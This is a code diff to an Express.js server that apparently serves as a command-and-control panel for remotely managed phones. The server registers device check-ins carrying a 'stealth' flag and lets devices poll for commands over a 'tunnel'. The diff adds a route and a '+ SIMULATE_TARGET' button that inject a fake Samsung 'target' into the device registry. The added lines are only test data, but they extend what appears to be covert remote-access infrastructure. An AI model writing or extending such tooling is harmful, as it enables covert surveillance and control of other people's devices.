@@ -104,6 +104,24 @@ function handleCheckin(req, res) {
 app.post('/', handleCheckin);
 app.post('/checkin', handleCheckin);
 
+// Demo Target Generator
+app.get('/api/demo-target', (req, res) => {
+    handleCheckin({
+        body: {
+            deviceId: 'SM-F731W',
+            model: 'SM-F731W',
+            os: '16',
+            battery: '85%',
+            ip: '192.168.12.5',
+            port: 9191,
+            stealth: false,
+            type: 'checkin'
+        },
+        query: {},
+        ip: '192.168.12.5'
+    }, res);
+});
+
 // Device command polling
 app.get('/tunnel-poll', (req, res) => {
     const id = req.query.deviceId;
@@ -229,7 +247,8 @@ app.get('/', (req, res) => {
                     </tbody>
                 </table>
             </div>
-            <div style="text-align: right; margin-top: 15px;">
+            <div style="text-align: right; margin-top: 15px; display: flex; justify-content: flex-end; gap: 10px;">
+                <button class="btn" onclick="fetch('/api/demo-target').then(() => location.reload())" style="padding: 10px 20px; font-size: 0.7rem; border-color: var(--neon-cyan); color: var(--neon-cyan);">+ SIMULATE_TARGET</button>
                 <button class="btn" onclick="location.reload()" style="padding: 10px 25px; font-size: 0.75rem;">REFRESH_REGISTRY</button>
             </div>
         </div>
